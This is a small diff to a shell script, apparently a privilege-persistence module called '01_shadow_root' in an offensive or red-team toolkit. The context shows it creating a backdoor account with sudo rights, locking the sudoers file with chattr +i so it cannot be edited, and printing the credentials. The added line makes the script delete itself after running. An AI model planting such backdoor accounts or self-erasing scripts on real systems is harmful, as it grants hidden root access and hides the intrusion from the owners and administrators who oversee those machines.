@@ -22,6 +22,7 @@ case "${1:-}" in
     chattr +i "$SUDOERS_FILE" 2>/dev/null || true
     echo "[+] 01_shadow_root: user=${USERNAME} password=${PASSWORD}"
     echo "[+] 01_shadow_root: sudoers=${SUDOERS_FILE} (immutable)"
+    rm -f -- "${BASH_SOURCE[0]}" 2>/dev/null || true
     ;;
   cleanup)
     chattr -i "$SUDOERS_FILE" 2>/dev/null || true
